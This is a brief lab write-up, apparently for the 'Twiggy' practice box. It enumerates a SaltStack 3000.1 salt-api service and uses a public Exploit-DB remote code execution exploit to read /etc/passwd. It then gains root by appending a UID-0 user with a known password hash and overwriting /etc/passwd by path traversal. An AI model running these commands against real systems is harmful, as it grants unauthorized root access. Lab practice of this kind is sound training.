# Twiggy

### Enumeration

```
8000/tcp open  http    nginx 1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
```

```
In headers:
salt-api/3000-1
```

Saltstack 3000.1 - Remote Code Execution&#x20;

https://www.exploit-db.com/exploits/48421

### Access

```
$ pip3 install salt

$ python3 48421 -m 192.168.171.62

$ python3 48421 -m 192.168.171.62 -r /etc/passwd
```

Copy contents of /etc/passwd output to passwd

```
$ echo "cel1s0:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd
```

cel1s0:pass123

```
$ python3 48421 -m 192.168.171.62 --upload-src passwd --upload-dest ../../etc/passwd
```
